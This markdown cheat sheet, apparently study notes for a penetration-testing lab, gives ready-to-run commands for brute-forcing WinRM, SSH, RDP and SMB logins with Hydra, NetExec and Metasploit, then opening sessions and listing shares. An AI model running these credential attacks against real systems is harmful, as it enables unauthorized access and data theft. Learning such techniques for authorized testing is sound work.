# Network Password Attacks

Commands and tools for brute forcing network services (WinRM, SSH, RDP, SMB) to gain initial access.  
Each section explains the purpose and how the commands are typically used.

---

## Tools

```bash
sudo apt-get -y install netexec
sudo gem install evil-winrm
```

---

## WinRM – [NetExec](https://github.com/Pennyw0rth/NetExec)

WinRM often exposes remote PowerShell access on Windows systems.  
With valid credentials, [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) provides an interactive session.

```bash
# Brute force with NetExec
netexec winrm 10.129.42.197 -u user.list -p password.list

# Connect interactively once creds are valid
evil-winrm -i 10.129.42.197 -u user -p password
```

---

## SSH – Hydra

SSH is a common brute force target if password authentication is enabled.  
Hydra can quickly attempt user/pass combinations.

```bash
# Brute force SSH with Hydra
hydra -L user.list -P password.list ssh://10.129.42.197

# Connect manually once creds are found
ssh user@10.129.42.197
```

---

## RDP – Hydra

RDP brute forcing is slower but can provide full desktop access if successful.  

```bash
# Brute force RDP with Hydra
hydra -L user.list -P password.list rdp://10.129.42.197

# Connect interactively with xfreerdp
xfreerdp /v:10.129.42.197 /u:user /p:password
```

---

## SMB – Hydra or Metasploit

SMB shares often reveal sensitive data. Weak creds can be brute forced with Hydra or Metasploit.

```bash
# Hydra brute force
hydra -L user.list -P password.list smb://10.129.42.197

# Metasploit module
msf6 > use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list

# Enumerate shares with NetExec
netexec smb 10.129.42.197 -u "user" -p "password" --shares

# Access a share manually
smbclient -U user \\10.129.42.197\SHARENAME
```